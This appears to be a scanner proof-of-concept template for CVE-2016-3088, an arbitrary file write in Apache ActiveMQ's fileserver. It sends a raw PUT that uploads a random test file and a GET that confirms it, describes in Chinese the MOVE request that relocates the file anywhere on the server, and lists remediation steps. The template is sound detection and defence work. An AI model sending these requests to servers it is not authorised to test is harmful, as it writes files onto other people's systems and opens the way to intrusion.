id: poc-yaml-CVE-2016-3088
info:
  name: ActiveMQ任意文件操作漏洞
  author:
  - 折跃
  description: |-
    ActiveMQ任意文件操作漏洞
    本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。
  severity: critical
  remediation: |-
    #### 官方修复方案：
    升级系统至无漏洞版本，或于官网下载安全补丁。

    #### 临时修复方案：
    1. 升级系统至无漏洞版本
    2. 将上传目录设置无写入权限
    3. 手动修改代码去除漏洞代码或添加鉴权
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code_1 == 204
    - status_code_2 == 200
    - contains(body_2,'{{fileDate}}')
  raw:
  - |
    PUT /fileserver/{{fileName}}.txt HTTP/1.1
    Host: {{Hostname}}

    {{fileDate}}
  - |
    GET /fileserver/{{fileName}}.txt HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Accept-Language: en
  req-condition: true
variables:
  fileDate: '{{rand_text_alphanumeric(32,"")}}'
  fileName: '{{rand_text_alphanumeric(6,"")}}'
